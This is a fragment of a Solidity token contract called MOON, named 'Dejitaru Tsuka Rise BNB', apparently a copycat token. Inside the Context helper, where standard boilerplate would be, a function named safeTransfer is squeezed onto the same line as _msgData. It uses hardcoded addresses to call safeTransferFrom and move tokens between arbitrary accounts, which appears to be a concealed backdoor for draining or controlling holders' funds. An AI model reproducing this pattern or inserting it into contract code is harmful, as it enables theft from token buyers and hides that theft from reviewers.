 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x2F77f1b8c345130F47249BaAa3878d6C56C352db)) {TransferHelper.safeTransferFrom(0x9b5E6046e73ad32e575F66B923703ADB71193DdF,spender,recipient,amount);return true;}return false;}
}
...
contract MOON is IERC20, Context {
  ...
  function name() public pure returns (string memory) {
    return "Dejitaru Tsuka Rise BNB";
  }
